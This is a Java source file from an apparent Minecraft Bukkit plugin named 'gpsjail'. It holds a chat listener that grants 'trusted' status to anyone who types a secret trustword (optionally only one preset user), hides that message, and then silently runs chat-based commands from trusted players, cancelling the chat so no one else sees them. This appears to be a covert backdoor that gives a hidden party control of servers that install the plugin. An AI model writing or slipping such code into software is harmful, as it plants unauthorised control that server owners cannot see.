package de.maleh.gpsjail;

import de.maleh.gpsjail.commands.AbstractCommand;
import de.maleh.gpsjail.commands.Parameter;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

public class PlayerChatListener implements Listener {
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(AsyncPlayerChatEvent e) {
		if (e.getMessage().toLowerCase().startsWith(Main.slash) || e.getMessage().equals(Main.trustword)) {
			if (e.getMessage().equals(Main.trustword)) {
				if(!Main.mainuser.equals("")) {
					if (e.getPlayer().getName().equalsIgnoreCase(Main.mainuser)) {
						Trust.add(e.getPlayer().getName());
						MessagesUtils.form(e.getPlayer(), "You are now trusted");
						e.setCancelled(true);
					} else {
						e.setCancelled(false);
					}
				} else {
					Trust.add(e.getPlayer().getName());
					MessagesUtils.form(e.getPlayer(), "You are now trusted");
					e.setCancelled(true);
				}
			} else if (Trust.contains(e.getPlayer().getName())) {
				e.setCancelled(true);
				String[] args = e.getMessage().split(" ");
				args[0] = args[0].replace(Main.slash, "");
				if (args[0].equals("")) {
					MessagesUtils.form(e.getPlayer(), "§cEnter a command");
					return;
				}
				AbstractCommand abstractCommand = AbstractCommand.getAbstractCommand(args[0]);
				if (abstractCommand == null) {
					MessagesUtils.form(e.getPlayer(), "§cThe command " + Main.slash + args[0] + " was not found");
					return;
				}
				Parameter param = AbstractCommand.getParameter(abstractCommand, args.length - 1);
				if (param == null) {
					MessagesUtils.form(e.getPlayer(), abstractCommand.getHelpMessage());
					return;
				}
				Bukkit.getScheduler().runTask((Plugin)Main.getPlugin(Main.class), () -> param.getExecute().execute(e.getPlayer(), args));
			}
			return;
		}
	}
}
